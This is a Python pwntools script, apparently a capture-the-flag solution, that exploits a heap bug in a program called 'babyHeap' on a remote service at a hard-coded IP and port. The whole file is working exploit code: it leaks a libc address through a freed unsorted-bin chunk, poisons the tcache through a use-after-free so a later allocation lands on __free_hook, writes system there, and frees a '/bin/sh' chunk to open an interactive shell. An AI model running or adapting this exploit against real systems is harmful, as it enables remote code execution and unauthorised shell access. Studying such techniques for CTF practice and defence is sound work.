from pwn import *

BEDUG = False

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if BEDUG==True:
    io = process('./babyHeap')
else:
    io = remote('34.125.0.41', 8888)


def create(idx, size, data):
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'Idx: '))
    io.sendline(str(idx).encode('utf-8'))
    print(io.recvuntil(b'Size: '))
    io.sendline(str(size).encode('utf-8'))
    print(io.recvuntil(b'Data: '))
    io.send(data)

def delete(idx):
    print(io.recvuntil(b'> '))
    io.sendline(b'3')
    print(io.recvuntil(b'Idx: '))
    io.sendline(str(idx).encode('utf-8'))

def show(idx):
    print(io.recvuntil(b'> '))
    io.sendline(b'4')
    print(io.recvuntil(b'Idx: '))
    io.sendline(str(idx).encode('utf-8'))

def edit(idx, data):
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recvuntil(b'Idx: '))
    io.sendline(str(idx).encode('utf-8'))
    print(io.recvuntil(b'Data: '))
    io.send(data)


for i in range(9):
    create(i, 0x90, b'/bin/sh\0')

for i in range(7):
    delete(i)

delete(7)
show(7)
print(io.recvuntil(b'Data: \n'))
libc.address = u64(io.recv(6)+b'\0\0') - 0x1ebbe0
print(hex(libc.address))

create(7, 0x90, b'/bin/sh\0')
create(6, 0x90, b'/bin/sh\0')
create(0, 0x90, b'/bin/sh\0')
delete(0)
edit(0, b'AAAAAAAAAAAAAA')
delete(0)
payload = p64(libc.sym['__free_hook'])+p64(0)
edit(0, payload)
create(0, 0x90, b'A')
payload = p64(libc.sym['system'])
create(0, 0x90, payload)
delete(7)
io.interactive()
